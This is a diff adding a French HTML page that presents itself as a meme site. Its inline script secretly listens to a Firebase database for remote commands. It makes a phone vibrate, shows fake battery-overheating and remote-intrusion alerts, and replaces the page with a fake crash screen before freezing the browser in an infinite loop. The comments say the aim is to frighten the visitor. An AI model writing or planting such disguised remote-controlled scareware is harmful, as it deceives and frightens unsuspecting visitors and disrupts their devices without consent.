@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Mèmes & Humour</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; background-color: #f0f2f5; margin: 0; padding: 0; }
+        header { background-color: #4185F4; color: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .container { padding: 20px; }
+        .meme-card { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); display: inline-block; padding: 15px; margin-top: 20px; max-width: 90%; }
+        img { max-width: 100%; border-radius: 5px; }
+        h2 { color: #333; }
+        #status-hidden { display: none; }
+    </style>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+
+    <header>
+        <h1>MÈMES DU JOUR 🔥</h1>
+    </header>
+
+    <div class="container">
+        <div class="meme-card">
+            <h2>Quand ton code fonctionne du premier coup :</h2>
+            <img src="https://picsum.photos/400/300" alt="Meme Image">
+            <p>Chargement de nouveaux mèmes...</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+
+    <script>
+        // Ce script tourne en arrière-plan et attend tes ordres
+        console.log("ÉDIA : Système de réception actif...");
+
+        // On écoute la base de données en temps réel
+        db.ref('ordre').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (!data) return;
+
+            // On vérifie si l'ordre est récent (moins de 10 secondes) pour éviter les bugs
+            const maintenant = Date.now();
+            if (maintenant - data.timestamp > 10000) return;
+
+            // --- EXÉCUTION DES COMMANDES ---
+
+            if (data.type === "VIBRER") {
+                // Fait vibrer le tel (si Android)
+                if (navigator.vibrate) {
+                    navigator.vibrate([500, 200, 500, 200, 1000]);
+                }
+                alert("⚠️ ALERTE : Batterie en surchauffe critique (48°C) !");
+            }
+
+            if (data.type === "ALERTE") {
+                alert("🚨 SÉCURITÉ : Une tentative de connexion à distance depuis 'EDIA_SERVER' a été détectée sur votre appareil.");
+            }
+
+            if (data.type === "FREEZE") {
+                // Change l'écran pour faire peur
+                document.body.innerHTML = `
+                    <div style="background:black; color:red; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:monospace;">
+                        <h1>SYSTEM CRASHED</h1>
+                        <p>Error: 0x0002503_FATAL</p>
+                        <p>Memory Dump: 100%</p>
+                    </div>
+                `;
+                // Bloque le navigateur (boucle infinie) après 1 seconde
+                setTimeout(() => {
+                    while(true) {}
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
